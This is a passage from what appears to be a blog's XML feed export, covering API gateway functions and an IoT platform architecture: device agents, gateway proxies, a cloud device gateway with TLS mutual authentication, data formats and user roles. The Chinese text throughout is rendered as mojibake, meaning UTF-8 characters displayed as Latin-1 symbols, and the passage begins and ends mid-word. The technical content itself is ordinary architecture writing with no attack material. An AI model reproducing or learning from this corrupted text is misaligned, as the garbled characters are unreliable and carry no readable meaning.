åŽç«¯çš„æœåŠ¡èµ„æºä¸å¯èƒ½æ— é™åŠ¨æ€æ‰©å±•, ç»ˆæœ‰è¯», ä¸ºäº†ä¿æŠ¤åŽç«¯æœåŠ¡ä¸è¢«å‡»åž®, å¯ä»¥åœ¨ç½‘å…³å±‚åšè®¿é—®é€ŸçŽ‡çš„é™åˆ¶ã€‚ åŸºäºŽIPçš„è®¿é—®æŽ§åˆ¶è¿™ä¸ªæ˜¯WAFçš„åŸºæœ¬åŠŸèƒ½, é¿å…DOS, å°é”æŸä¸ªIPçš„æ¶æ„è®¿é—®ã€‚ åè®®è½¬æ¢ç½‘å…³æä¾›RESTfulçš„HTTPçš„æŽ¥å£, ä½†æ˜¯åŽç«¯ å¯èƒ½æä¾›æœåŠ¡çš„åè®®å¯èƒ½å„ä¸ç›¸åŒé€š, æ¯”å¦‚gRPC, HTTP, MQ, ç­‰ã€‚å› æ­¤ç½‘å…³åº”è¯¥èƒ½é€‚é…å¤šåè®®çš„æ”¯æŒã€‚ è¯·æ±‚è·¯ç”±åŸºäºŽURLçš„è·¯ç”±åŠŸèƒ½ APIä½¿ç”¨ç»Ÿè®¡è®°å½•API Metricå¦‚è¯·æ±‚æ¬¡æ•°ã€è¯·æ±‚å¤§å°ã€å“åº”çŠ¶æ€å’Œå»¶è¿Ÿï¼Œå¯è§†åŒ–API Metric å‚è€ƒæµ…è°ˆ API Gatewayå¾®æœåŠ¡æž¶æž„ä¸­çš„API Gatewayå¾®æœåŠ¡å®žæˆ˜ï¼ˆäºŒï¼‰ï¼šä½¿ç”¨API Gatewayä¼ä¸šçº§APIç½‘å…³çš„è®¾è®¡é¢å‘æœåŠ¡æž¶æž„]]></content>
      <tags>
        <tag>APIGateway</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOTæž¶æž„]]></title>
    <url>%2F2017%2F07%2F17%2Fiot-architecture%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘å¼€å‘äº†ä¸€æ¬¡IOTç»„ä»¶, åœ¨æ­¤æœŸé—´ä¹Ÿå‚è€ƒäº†ä¸‹å…¶ä»–IOTå¹³å°çš„è®¾è®¡æž¶æž„, æœ‰æ‰€æ„Ÿæƒ³, å› æ­¤å°†å…¶è®°å½•ä¸‹æ¥, å’Œå¤§å®¶åˆ†äº«, æ¬¢è¿Žäº¤æµã€‚ IOTæ˜¯ä»€ä¹ˆIoTæ˜¯Internet of Thingsçš„ç¼©å†™, å®ƒæ˜¯äº’è”ç½‘ä»Žäººå‘ç‰©çš„å»¶ä¼¸, æ ¸å¿ƒå’ŒåŸºç¡€ä»ç„¶æ˜¯äº’è”ç½‘æŠ€æœ¯ï¼Œæ˜¯äº’è”ç½‘æŠ€æœ¯åŸºç¡€ä¸Šçš„å»¶ä¼¸å’Œæ‰©å±•ã€‚ å®ƒå°†å„ç§ä¿¡æ¯ä¼ æ„Ÿè®¾å¤‡ï¼Œå¦‚å°„é¢‘è¯†åˆ«è£…ç½®ã€çº¢å¤–æ„Ÿåº”å™¨ã€å…¨çƒå®šä½ç³»ç»Ÿã€æ¿€å…‰æ‰«æå™¨ç­‰ç§ç§è£…ç½®, æŒ‰çº¦å®šçš„åè®®, å°†ä»»ä½•ç‰©å“ä¸Žäº’è”ç½‘ç›¸è¿žæŽ¥, è¾¾åˆ°ç‰©å“ä¹‹é—´è¿›è¡Œä¿¡æ¯äº¤æ¢å’Œé€šè®¯çš„ç›®çš„ï¼Œä»¥å®žçŽ°æ™ºèƒ½åŒ–è¯†åˆ«ã€å®šä½ã€è¿½è¸ªã€ç›‘æŽ§å’Œç®¡ç†ç­‰ã€‚IOTä¹Ÿå°†åŠ é€ŸAIçš„è§‰é†’, å®ƒå°†ä¸‡ç‰©äº’è”, å†åŠ ä¸Šæˆç†Ÿçš„å¤§æ•°æ®å¤„ç†, æ·±åº¦å­¦ä¹ çš„åº”ç”¨ ä¼šè®©ä¸‡ç‰©éƒ½å¸¦æœ‰çµæ€§, è¿™æ˜¯å¤šä¹ˆå®å¤§çš„ä¸€ä¸ªæ—¶ä»£, 2016è¢«ç§°ä¸ºAIçš„å…ƒå¹´, éšç€IOTçš„åŠ é€Ÿ, æˆ‘ä»¬å°†æ˜¯è¿™æ ·ä¸€ä¸ªæ—¶ä»£çš„è§è¯è€…,è§è¯AIè§‰é†’çš„ç¬¬ä¸€ä»£äººã€‚ä¸‹é¢æ˜¯ä¸€å¼ ç‰©è”ç½‘åœ¨å·¥ä¸šå¼•ç”¨çš„ä¸€å¼ å›¾è¿™æ ·çœ‹æ¥æœªæ¥å¾ˆç¾Žå¥½, ä½†æ˜¯çŽ°å®žå¾ˆæ®‹é…·, å¦‚ä½•å®žçŽ°è½åœ°ä¸€å¥—å¯é çš„IOTæ–¹æ¡ˆä»»ç„¶æ˜¯ä¸ªéš¾é¢˜, åœ¨å‚è€ƒäº†ä¸€äº›å›½å¤–çš„æ–¹æ¡ˆè¿‡åŽ, ç»“åˆè‡ªå·±çš„å®žè·µ, ç»™å‡ºäº†ä¸€ç§æˆ‘è®¤ä¸ºçš„å¯è½åˆ°çš„IOTæ–¹æ¡ˆæž¶æž„ã€‚ IOTçš„éš¾ç‚¹IOTåœ¨è½åœ°è¿‡ç¨‹ä¸­æœ‰è¯¸å¤šéš¾ç‚¹, å›½å†…å¾ˆå¤šIOTä¹Ÿæ˜¯åˆšèµ·æ­¥çš„çŠ¶æ€, èƒ½å‚è€ƒçš„å°±å›½å¤–å‡ å®¶äº‘çš„å¤§åŽ‚å•†ã€‚ æ¶‰åŠæŠ€æœ¯ä¼—å¤šIOTæ¶‰åŠåˆ°å¾ˆå¤šæŠ€æœ¯, ä¸‹é¢ä¸€å¼ å›¾ ä»Žå‡ ä¸ªç»´åº¦å±•ç¤ºäº†IOTæ¶‰åŠåˆ°çš„ä¸€äº›æŠ€æœ¯ç‚¹:ä»ŽæŠ€æœ¯ä¸Šçœ‹, æ¶‰åŠä¼—å¤šæŠ€æœ¯, å› æ­¤å¯¹å¼€å‘è€…æœ‰ä¸€å®šçš„è¦æ±‚, æ‹›äººæ˜¯ä¸ªé—®é¢˜ã€‚ æž¶æž„éš¾è®¾è®¡IOTé¢å¯¹çš„æ˜¯ä¸‡ç‰©, åœ¨ä¸‡ç‰©æŽ¥å…¥æ—¶éœ€è¦è€ƒè™‘åˆ° æ•°æ®çš„å®‰å…¨, é“¾æŽ¥çš„ç®¡ç†, æµ·é‡æµæ•°æ®ä¸Šä¼ , æµ·é‡æ•°æ®çš„å­˜å‚¨ ç®¡ç† åˆ†æžã€‚ç»¼åˆæ¥è¯´ æž¶æž„è®¾è®¡å¿…é¡»æ»¡è¶³: æµ·é‡ã€é€šç”¨ã€å¯æ‰©å±•ã€ç®€å• å› æ­¤è¿™æ˜¯ä¸€å¥—åºžå¤§çµæ´»çš„ç³»ç»Ÿ, è€Œè¿™æ ·çš„ç³»ç»Ÿ å¾€å¾€äº‘åŽ‚å•†æ¯”è¾ƒæœ‰ç»éªŒ, æ¯”å¦‚Openstackçš„è®¾è®¡å°±æ˜¯ä¸€ä¸ªä¸é”™çš„æž¶æž„ã€‚æ•´ä½“è€Œè¨€IOTçš„æž¶æž„åº”è¯¥å±žäºŽå¾®æœåŠ¡æž¶æž„, å¾®æœåŠ¡æž¶æž„çš„è®¾è®¡å’Œå¼€å‘ å¾€å¾€éƒ½æ˜¯æŠŠåŒåˆƒå‰‘, å¦‚æžœåˆ’ä¸æ¸…æœåŠ¡çš„è¾¹ç•Œ(é¢†åŸŸåˆ’åˆ†)å’Œè§„èŒƒä¸äº†æœåŠ¡äº¤äº’çš„æµç¨‹å’Œæ–¹å¼, é‚£ä¹ˆè¿™æ ·çš„æž¶æž„ä¹Ÿæ˜¯ä¸€ä¸ªç¾éš¾, æœ€ç»ˆé€ æˆ ç†ä¸æ–­å‰ªè¿˜ä¹±çš„ä¸€ä¸ªå±€é¢ã€‚ä¸‹é¢æ˜¯ä¸€å¼ åŸºç¡€çš„IOTæž¶æž„å›¾, èƒ½å¾ˆå¥½çš„æè¿°IOTä¸­æ ¸å¿ƒçš„å…³é”®ç‚¹: æž¶æž„æ¦‚è¿°å†å¤æ‚çš„äº‹å„¿, ä¹Ÿéœ€è¦æŠ“ä½å…¶æ ¸å¿ƒç‚¹ æ‰èƒ½æœ‰æ•ˆå±•å¼€ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦çŸ¥é“è¿™ä¸ªæž¶æž„çš„ç²¾é«“æ˜¯å•¥, åœ¨å›´ç»•é‚£æ ¸å¿ƒç‚¹ã€‚å‚è€ƒä¸Šé¢é‚£å¼ æž¶æž„å›¾, æˆ‘ä»¬å¯ä»¥ç†è§£IOTçš„æ ¸å¿ƒåœ¨å®Œæˆè¿™æ ·å‡ ä»¶äº‹: è¿žæŽ¥è®¾å¤‡ è®¾å¤‡æ•°æ®åˆ†æž è®¾å¤‡æ•°æ®è¿è¥ä¸Žå¯è§†åŒ– æ ¸å¿ƒä¹‹å¤–æ˜¯ä»¥ä¸‹å‘¨è¾¹æœåŠ¡, ç”¨äºŽæå‡å’Œæ‰©å±•åŠŸèƒ½: åŠŸèƒ½å¹³å°: æ¯”å¦‚æ¶ˆæ¯é€šçŸ¥, æä¾›å¯¹å¹³å°æ ¸å¿ƒåŠŸèƒ½ä»¥å¤–çš„ä¸€äº›è¡¥å……ã€‚ æž¶æž„è¯¦è§£åœ¨å‚è€ƒäº†AWSå’ŒAzureçš„IOTè¿‡åŽ, ç»“åˆè‡ªå·±çš„è®¤è¯†,æ€»ç»“å‡ºæ¥çš„IOTæž¶æž„å›¾ã€‚æŒ‰ç…§é¢†åŸŸå¯¹æ¨¡å—è¿›è¡Œåˆ’åˆ†, ä¸»è¦ç”±å‡ ä¸‹å‡ ä¸ªæ¨¡å—ç»„æˆ: è¿žæŽ¥è®¾å¤‡: æœ¬åœ°: è´Ÿè´£è®¾å¤‡æ•°æ®çš„é‡‡é›†ä¸ŠæŠ¥ä¸Žåå‘æŽ§åˆ¶ã€‚ äº‘ç«¯: å°†æ‰€æœ‰è®¾å¤‡æŽ¥å…¥äº‘ï¼ŒæŽ¥æ”¶æ•°æ®ï¼ŒåŒæ—¶è´Ÿè´£ç®¡ç†è¿™äº›è®¾å¤‡çš„æŽˆæƒå’Œé™åˆ¶ æ•°æ®åˆ†æž: é€šè¿‡æä¾› ç¦»çº¿è®¡ç®—æˆ–è€…åœ¨çº¿è®¡ç®—çš„å¯ç¼–ç¨‹æŽ¥å£ ä¸ºç”¨æˆ·æä¾›æ•°æ®åˆ†æžçš„èƒ½åŠ› æ•°æ®å¯è§†åŒ–ä¸Žè¿è¥: é‡‡é›†ä¸ŠæŠ¥çš„æ•°æ®ä»¥åŠåˆ†æžè¿‡åŽçš„æ•°æ®çš„å¯è§†åŒ–, æ•°æ®æ ‡è®°, æ•°æ®æŽˆæƒç­‰å¸¦ä¸šåŠ¡æ€§è´¨çš„æ•°æ®ç®¡ç†ã€‚ APIç½‘å…³: è´Ÿè´£è¯·æ±‚çš„ç»Ÿä¸€ä»£ç†, å±è”½æŽ‰å†…éƒ¨ç³»ç»Ÿçš„å¤æ‚æ€§ã€‚ ç”¨æˆ·ç®¡ç†: ç»Ÿä¸€çš„ç”¨æˆ·ä½“ç³» ç”¨äºŽç”¨æˆ·ç®¡ç†, æƒé™ç®¡ç† æ¦‚å¿µç®€ä»‹æ•´ä¸ªæž¶æž„ä¸­ è®¾è®¡åˆ°å¦‚ä¸‹ä¸€äº›æ¦‚å¿µ: ä¸šåŠ¡æ¦‚å¿µ: ä¸Žæ•°æ®ç›¸å…³, ç”¨æˆ·è‡ªå·±å®šä¹‰çš„ è®¾å¤‡(device): ç”¨æˆ·çš„éœ€è¦æŽ¥å…¥äº’è”ç½‘çš„å®žä½“è®¾å¤‡ ç³»ç»Ÿæ¦‚å¿µ: ä¸Žç³»ç»Ÿç»„ä»¶ç›¸å…³, é€šè¿‡ç³»ç»Ÿç»„ä»¶æ¥æŽ¥å…¥çš„æ•°æ®çš„ç»„ä»¶ ä»£ç†(agent): èŽ·å–è®¾å¤‡ä¿¡æ¯å’ŒæŽ§åˆ¶è®¾å¤‡çš„ä»£ç† è®¾å¤‡ç½‘å…³ä»£ç†(device-gateway-proxy): ä»£ç†device-gatewayéªŒè¯è®¾å¤‡, ä»£ç†è®¾å¤‡ä¸Žäº‘ç«¯é€šä¿¡ è®¾å¤‡ç½‘å…³(device-gateway): äº‘ç«¯è®¾å¤‡ç½‘å…³, ç®¡ç†è®¾å¤‡æŽ¥å…¥æ•´ä¸ªç³»ç»Ÿå¯¹äºŽä¸åŒè§’è‰²çš„åˆ’åˆ†: è¶…çº§ç®¡ç†å‘˜: å…·æœ‰ç³»ç»Ÿå·²ç»æ•°æ®çš„æ‰€æœ‰æƒé™ è®¾å¤‡ç®¡ç†å‘˜: è´Ÿè´£å°†è®¾å¤‡åŠ å…¥ç³»ç»Ÿ, æŸ¥çœ‹è®¾å¤‡çš„æ•°æ®, ä»¥åŠä»¥è®¾å¤‡ä¸ºç»´åº¦çš„æ•°æ®æƒé™åˆ†é… æ•°æ®è¿è¥å‘˜: è´Ÿè´£ç‚¹ä½æ•°æ®çš„å¤šç»´åº¦ç®¡ç†(åŸºç¡€ç»´åº¦æ˜¯è®¾å¤‡), ä»¥ä¸šåŠ¡ä¸ºç»´åº¦çš„æ•°æ®æƒé™åˆ†é… ç®—æ³•ç®¡ç†å‘˜: è´Ÿè´£ç®¡ç†å’Œè¿è¡Œç›¸åº”ç»´åº¦çš„ç®—æ³•(åŸºç¡€ç»´åº¦æ˜¯è®¾å¤‡), ä»¥åŠæ•°æ®çš„æŸ¥çœ‹æƒé™ æ™®é€šç”¨æˆ·æˆ–è€…ç¬¬ä¸‰æ–¹å¼€å‘è€…: è´Ÿè´£ç‚¹ä½æ•°æ®çš„å¤šç»´åº¦æŸ¥çœ‹(åŸºç¡€ç»´åº¦æ˜¯è®¾å¤‡) è®¾å¤‡è¿žæŽ¥è®¾å¤‡çš„è¿žæŽ¥åˆ†ä¸º2éƒ¨åˆ†äº‘ç«¯å’Œæœ¬åœ°2éƒ¨åˆ†æž„æˆ, ç”±äºŽäº‘ç«¯å’Œæœ¬åœ°ç½‘ç»œçš„å·®å¼‚, éœ€è¦è€ƒè™‘: ç½‘ç»œçš„å®‰å…¨ ç½‘ç»œçš„ä¸ç¨³å®šä¸ºäº†æ–¹ä¾¿æœ¬åœ°è®¾å¤‡ä¸Žäº‘ç«¯ç›¸è¿ž, éœ€è¦çº¦å®šä¸€ä¸ªåè®®, å› æ­¤éœ€è¦è€ƒè™‘: é€šä¿¡åè®®çš„å¤šé€‚é…: æ¯”å¦‚MQTT, HTTP, CoAPç­‰ æ•°æ®æ ¼å¼å®šä¹‰ç”±äºŽæœ¬åœ°ç½‘ç»œçš„å¤æ‚å¤šå˜æ€§, æˆ‘ä»¬å¯èƒ½éœ€è¦é¢å¯¹ä¸åŒçš„åœºæ™¯: è®¾å¤‡èƒ½ç›´æŽ¥è”ç½‘ä¸ŠæŠ¥æ•°æ® è®¾å¤‡æ— æ³•è”ç½‘, éœ€è¦å°†æ•°æ®å‘ç”Ÿç»™æœ¬åœ°ä¸€ä¸ªç½‘å…³ä»£ç†, ç”±ç½‘å…³ä»£ç†ç»Ÿä¸€ä¸ŠæŠ¥æ•°æ®è®¾å¤‡è¿žæŽ¥çš„ä¸€ä¸ªæž¶æž„ç¤ºæ„å›¾: æœ¬åœ°æœ¬åœ°ä¼šè´Ÿè´£è®¾å¤‡æ•°æ®çš„é‡‡é›†ä¸ŠæŠ¥ä»¥åŠæŽ§åˆ¶, è¿™äº›åŠŸèƒ½ç”±ä¸€ä¸ªagentè´Ÿè´£å®Œæˆ, å®ƒåŠŸèƒ½æ–¹å‘å¦‚ä¸‹: æ•°æ®é‡‡é›†ä¸Žä¸ŠæŠ¥: é…ç½®äº‘ç«¯å‡­è¯, æŒ‰ç…§çº¦å®šåè®®ä¸ŠæŠ¥è®¾å¤‡æ•°æ®ã€‚ æŽ¥æ”¶äº‘ç«¯æŽ§åˆ¶: å‘äº‘ç«¯æ±‡æŠ¥æŽ§åˆ¶æŒ‡ä»¤, æŽ¥æ”¶äº‘ç«¯å‘èµ·çš„æŽ§åˆ¶,ä»¥åŠè¿”å›žæ‰§è¡Œç»“æžœã€‚ è®¾å¤‡ä»£ç†(agent)è®¾å¤‡ä»£ç†è´Ÿè´£æ”¶é›†è®¾å¤‡çš„æ•°æ®, ç„¶åŽä¸ŠæŠ¥ç»™äº‘ç«¯ç½‘å…³, agentä½äºŽæ•°æ®ç¬¬ä¸€çº¿, éœ€è¦è€ƒè™‘è‰¯å¥½çš„æ‰©å±•æ€§, å› æ­¤é€‚åˆé‡‡ç”¨ æ’ä»¶å¼ é©±åŠ¨å¼€å‘æ¨¡å¼ã€‚é‡‡é›†å™¨éœ€è¦ä»Žäº‘ç«¯èŽ·å–è¯ä¹¦, é…ç½®äº‘ç«¯è®¾å¤‡ç¼–å·, ç„¶åŽæŒ‰ç…§æŒ‡å®šçš„æŠ¥æ–‡æ ¼å¼ å°†æ•°æ®ä¸ŠæŠ¥ç»™äº‘ç«¯ã€‚æ¯”å¦‚äº‘ç«¯è§„èŒƒçš„æ•°æ®ä¸ŠæŠ¥æ ¼å¼,ä»¥influxDBçš„æ•°æ®å†™å…¥æ ¼å¼ä¸ºä¾‹è¯´æ˜Ž:1234measurement[,tag_key1=tag_value1...] field_key=field_value[,field_key2=field_value2] [timestamp]1. ä¸€ç±»è®¾å¤‡ä¸€ä¸ªåº“, æ¯”å¦‚è½¦, æ¯”å¦‚é£žæœº, ä¸€ä¸ªåº“é‡Œé¢å­˜æ”¾æ‰€æœ‰è¿™ç±»è®¾å¤‡çš„æŒ‡æ ‡, ä¸€ç»„ç›¸å…³çš„æŒ‡æ ‡ä¸€ä¸ªç»„, æ¯”å¦‚å˜é€Ÿå™¨, é½¿è½®ç®±, ç®—æ³•è®¡ç®—çš„å¹³å‡é£žé€Ÿ2. æ‰€æœ‰ä¸Žæ•°æ®æ— å…³çš„æ•°æ® å‡ä»¥æ ‡ç­¾çš„æ–¹å¼å½•å…¥, è¿™äº›Tagåˆ†ä¸º2ç±»: 1.ç³»ç»Ÿæ ‡ç­¾: device-id, collector-id 2. ç”¨æˆ·è‡ªå®šä¹‰æ ‡ç­¾ agentæ ¸å¿ƒåŠŸèƒ½ç‚¹æ¦‚è¿°: æ•°æ®é‡‡é›†ä¸Žä¸ŠæŠ¥ æ•°æ®é‡‡é›†: ä»¥æ’ä»¶çš„å½¢å¼, æ”¯æŒå¤šåè®®é€‚é…, é»˜è®¤æƒ…å†µä¸‹ åªè¦æ•°æ®ç¬¦åˆè§„èŒƒ å°±å¯ä»¥ä¸ŠæŠ¥ æ•°æ®å¤„ç†: å¦‚ä½•æ•°æ®ä¸ç¬¦åˆè§„èŒƒ, éœ€è¦ç¼–å†™ æ•°æ®å¤„ç†æ’ä»¶, å¤„ç†æˆåˆæ³•è§„åˆ™ èšåˆæ•°æ®: å¦‚æžœæ•°æ®é‡è¿‡å¤§, å¯ä»¥ç¼–å†™èšåˆæ’ä»¶, å¯¹æ•°æ®è¿›è¡Œèšåˆ, æ¯”å¦‚é’ˆå¯¹è®¾å¤‡éœ‡é¢‘æ•°æ®ã€‚ æ•°æ®ä¸ŠæŠ¥: ç»åŽ†æ‰€æœ‰ä»¥ä¸Šæ­¥éª¤è¿‡åŽ, å°†æ•°æ®é€šè¿‡è®¾å¤‡çš„æ•°æ®ä¸ŠæŠ¥ç®¡é“ä¸ŠæŠ¥äº‘ç«¯ è®¾å¤‡æŽ§åˆ¶: æŽ§åˆ¶æŒ‡ä»¤ä¸ŠæŠ¥: agentå¯åŠ¨æ—¶éœ€è¦å°† å·²ç»å®žçŽ°çš„æŽ§åˆ¶æŒ‡ä»¤é€šè¿‡æŽ§åˆ¶ä¸Šä¼ é€šé“å‘äº‘ç«¯æ±‡æŠ¥ã€‚ æ‰§è¡ŒæŽ§åˆ¶æŒ‡ä»¤: agentè®¢é˜…æŽ§åˆ¶ä¸‹å‘ç®¡é“, å½“æœ‰å‘½ä»¤åˆ°æ¥æ—¶, ç«‹é©¬æ‰§è¡Œ, å¹¶ä¸”å°†ç»“æžœå†™å›žæŽ§åˆ¶ä¸Šä¼ ç®¡é“ã€‚ å¼‚å¸¸å¤„ç†: è®¾å¤‡ä¸‹çº¿å¼‚å¸¸: ç”±äºŽè®¾å¤‡ä¸‹çº¿æ— æ³•å’Œè®¾å¤‡å»ºç«‹è¿žæŽ¥, æ— æ³•é‡‡é›†æ•°æ®(DeviceOffLineError), é€šè¿‡æŽ§åˆ¶ä¸Šä¼ é€šé“ä¸ŠæŠ¥ ç‚¹ä½é‡‡é›†å¼‚å¸¸: ç”±äºŽè®¾å¤‡æ²¡æœ‰è¯¥ç‚¹ä½, æ— æ³•èŽ·å–åˆ°è¯¥ç‚¹ä½æ•°æ®(NoPointError), é€šè¿‡æŽ§åˆ¶ä¸Šä¼ é€šé“ä¸ŠæŠ¥ agentæŽ§åˆ¶: ä»£ç†é…ç½®: é€šè¿‡æŽ§åˆ¶ä¸‹å‘é€šé“, ä¸‹å‘ä»£ç†é…ç½®. ä»£ç†é‡å¯: é€šè¿‡æŽ§åˆ¶ä¸‹å‘é€šé“, å¾—çŸ¥ä»£ç†é‡æ–°é€šçŸ¥, é‡å¯ä»£ç†. çŠ¶æ€ä¸ŠæŠ¥: é€šè¿‡æŽ§åˆ¶ä¸Šä¼ é€šé“, æ±‡æŠ¥ä»£ç†çŠ¶æ€ agentå¼‚å¸¸: ä»£ç†è¿è¡Œå¼‚å¸¸: ä»£ç†å¼‚å¸¸ä¸‹çº¿åŠæ—¶é€šçŸ¥äº‘ç«¯(AgentRuntimeError) ç½‘å…³ä»£ç†(device-gateway-proxy)ç½‘å…³ä»£ç†ä¸»è¦è¿ç”¨äºŽä»£ç†æ— æ³•è®¿é—®å…¬ç½‘çš„åœºæ™¯(æœ‰ç«å¢™), å®ƒåœ¨æœ¬åœ°ç½‘ç»œä¸­æ‰®æ¼”ç€äº‘ç«¯ç½‘å…³çš„è§’è‰², æŽ§åˆ¶ç€æ‰€æœ‰è®¾å¤‡çš„è¿žæŽ¥, å› ä¸ºä»–æ˜¯ä»£ç†, æ‰€æœ‰ç›¸å…³æŽ§åˆ¶ä¿¡æ¯å‡ä»Žäº‘ç«¯ç½‘å…³èŽ·å–ã€‚ç½‘å…³ä»£ç†åœ¨è®¾è®¡æ—¶éœ€è¦æ»¡è¶³å¦‚ä¸‹åŽŸåˆ™: é€æ˜Žæ€§: å¯¹äºŽäº‘ç«¯æ¥è¯´, ä¸èƒ½å› ä¸ºä»£ç†è€Œå¸¦æ¥è®¾å¤‡å¤„ç†çš„å·®å¼‚æ€§, å› æ­¤ä»£ç†ä¸»è¦åŠŸèƒ½æ˜¯ä»£ç†è®¾å¤‡ ä¸Ž äº‘ç«¯é€šä¿¡, å¯¹äºŽäº‘ç½‘å…³æ¥è¯´ çœ‹åˆ°çš„ä¾ç„¶æ˜¯è®¾å¤‡,è€Œä¸æ˜¯ä»£ç†ã€‚ ç¼“å­˜æ€§: ä»£ç†éœ€è¦é¢ä¸´ç½‘ç»œä¸­æ–­,æ‰€ä»¥éœ€è¦æœ‰æ•°æ®ç¼“å­˜æœºåˆ¶, å¹¶ä¸”å¯ä»¥é…ç½®å­˜å‚¨ç­–ç•¥ã€‚ä»¥ä¸‹æ˜¯gateway-proxyçš„æ ¸å¿ƒåŠŸèƒ½æ¦‚è¿°: æ•°æ®ä¸ŠæŠ¥: æ£€æŸ¥è®¾å¤‡åˆæ³•æ€§: ç½‘å…³ä»£ç†èƒ½ä»£ç†é‚£äº›è®¾å¤‡å»ºç«‹è¿žæŽ¥ éœ€è¦ä»Žäº‘ç«¯ç½‘å…³èŽ·å–, å¦‚æžœè®¾å¤‡ä¸åˆæ³•, åˆ™æ‹’ç»ä¸ºè¯¥è®¾å¤‡å»ºç«‹è¿žæŽ¥ã€‚ æ•°æ®ä¸ŠæŠ¥: ç½‘å…³ä»£ç†æ¨¡æ‹Ÿagentä¸ŽçœŸæ­£çš„ç½‘å…³å»ºç«‹è¿žæŽ¥, é€šè¿‡è®¾å¤‡æ•°æ®ä¸ŠæŠ¥é€šé“ä¸ŠæŠ¥æ•°æ®åˆ°äº‘ç«¯ã€‚ è®¾å¤‡æŽ§åˆ¶: æŽ§åˆ¶æŒ‡ä»¤ä¸ŠæŠ¥: ä»£ç†è®¾å¤‡å»ºç«‹æŽ§åˆ¶ä¸Šä¼ é€šé“, ä¸ŠæŠ¥æŽ§åˆ¶æŒ‡ä»¤åˆ°äº‘ç«¯ã€‚ æ‰§è¡ŒæŽ§åˆ¶æŒ‡ä»¤: ä»£ç†è®¾å¤‡æŽ¥æ”¶æŽ§åˆ¶ä¸‹å‘é€šé“é‡Œé¢çš„ æŽ§åˆ¶æŒ‡ä»¤, è°ƒåº¦ç»™agentæ‰§è¡Œ, å°†ç»“æžœè¿”å›žåˆ°æŽ§åˆ¶ä¸ŠåŽ»é€šé“ã€‚ å¼‚å¸¸å¤„ç†: è®¾å¤‡ä¸‹çº¿å¼‚å¸¸: ç”±äºŽè®¾å¤‡ä¸‹çº¿æ— æ³•å’Œè®¾å¤‡å»ºç«‹è¿žæŽ¥, æ— æ³•é‡‡é›†æ•°æ®(DeviceOffLineError), é€šè¿‡æŽ§åˆ¶ä¸Šä¼ é€šé“ä¸ŠæŠ¥ ç‚¹ä½é‡‡é›†å¼‚å¸¸: ç”±äºŽè®¾å¤‡æ²¡æœ‰è¯¥ç‚¹ä½, æ— æ³•èŽ·å–åˆ°è¯¥ç‚¹ä½æ•°æ®(NoPointError), é€šè¿‡æŽ§åˆ¶ä¸Šä¼ é€šé“ä¸ŠæŠ¥ ç½‘å…³ä»£ç†æŽ§åˆ¶: proxyé…ç½®: é€šè¿‡proxyçš„æŽ§åˆ¶ä¸Šä¼ é€šé“ è¯·æ±‚ proxyçš„é…ç½®ä¿¡æ¯, é…ç½®proxyéœ€è¦ä»£ç†çš„è®¾å¤‡åˆ—è¡¨ proxyä»Žå¯: é€šè¿‡proxyçš„æŽ§åˆ¶ä¸‹å‘é€šé“ æ‰§è¡Œäº‘ç«¯å¯¹proxyçš„æ“ä½œ proxyçŠ¶æ€ä¸ŠæŠ¥: proxyé€šè¿‡æŽ§åˆ¶ä¸Šä¼ é€šé“ ä¸ŠæŠ¥è‡ªèº«çŠ¶æ€ agentçŠ¶æ€ä»£ç†ä¸ŠæŠ¥: proxyä»£ç†agent ä¸ŠæŠ¥çŠ¶æ€(proxyæŽ§åˆ¶ä¸Šä¼ é€šé“) agentå¼‚å¸¸ä»£ç†ä¸ŠæŠ¥: proxyä»£ç†agent ä¸ŠæŠ¥å¼‚å¸¸(proxyæŽ§åˆ¶ä¸Šä¼ é€šé“) ç½‘å…³ä»£ç†å¼‚å¸¸: proxyè¿è¡Œå¼‚å¸¸: åŠæ—¶å‘äº‘ç«¯ä¸ŠæŠ¥(ProxyRuntimeError), é€šè¿‡proxyæŽ§åˆ¶ä¸Šä¼ é€šé“ äº‘ç«¯(device-gateway)äº‘ç«¯è´Ÿè´£è®¾å¤‡çš„è¿žæŽ¥çš„ç»„ä»¶æˆ‘ä»¬ç§°ä¹‹ä¸ºè®¾å¤‡ç½‘å…³(device-gateway), å®ƒè´Ÿè´£æŽ¥æ”¶è®¾å¤‡ä¸Šä¼ çš„æ•°æ®ä¸Žè®¾å¤‡çš„æŽ§åˆ¶ã€‚è®¾å¤‡ç½‘å…³åœ¨è®¾è®¡æ—¶éœ€è¦æ»¡è¶³å¦‚ä¸‹åŽŸåˆ™: æ•°æ®å®‰å…¨: ä¸ºäº†ç¡®ä¿ç½‘å…³å’Œæ•°æ®ä¸ŠæŠ¥è€…ä¹‹é—´è¿™æ®µå…¬ç½‘æ•°æ®é“¾è·¯çš„å®‰å…¨, éœ€é‡‡ç”¨TLSè¿›è¡ŒåŠ å¯†å’ŒåŒå‘è®¤è¯ã€‚ æ•°æ®ç½‘å…³éœ€å……å½“CAçš„è§’è‰², å‘agentæˆ–è€…é¢å‘æ•°å­—è¯ä¹¦ æŽ¥å…¥è®¾å¤‡èµ„äº§çš„ç®¡ç† æ•°æ®å­˜å‚¨: åœ¨æ•°æ®å­˜å…¥æ•°æ®åº“ä¹‹å‰,è¿™äº›æ•°æ®è¢«ç§°ä¸ºäº‹ä»¶, æ•°æ®è¢«å­˜å‚¨ä¹‹åŽæˆä¸ºåŽ†å²æ•°æ®, äº‹ä»¶å’ŒåŽ†å²æ•°æ®åˆ†åˆ«å¯¹åº”ä¸åŒçš„åœºæ™¯device-gatewayçš„æŽ§åˆ¶å±‚åŠŸèƒ½æ¦‚è¿°: ç±»åž‹ç®¡ç†:è¿žæŽ¥ä¸Šäº‘ç«¯çš„è®¾å¤‡å¿…é¡»è¦æŒ‡æ˜Žè®¾å¤‡çš„ç±»åž‹, è®¾å¤‡ç±»åž‹ç”¨äºŽæ ¡éªŒ è®¾å¤‡ä¸Šä¼ çš„æ•°æ® æ˜¯å¦åˆè§„, å¦‚æžœä¸åˆè§„,å°±ä¸¢å¼ƒæŽ‰, ä½†æ˜¯éœ€è¦è®°å½•æ—¥å¿—, è®©ç”¨æˆ·å¯ä»¥æŸ¥çœ‹ç±»åž‹çš„å®šä¹‰ä»¥Jsonä¸ºä¸», éœ€è¦å®šä¹‰ å±žæ€§åç§°(å­—æ®µåç§°), å­—æ®µçš„å€¼çš„æ•°æ®ç±»åž‹, ä»¥åŠå…¶ä»–å­—æ®µçš„ç›¸å…³ä¿¡æ¯ã€‚ ç±»åž‹çš„å¢žåˆ 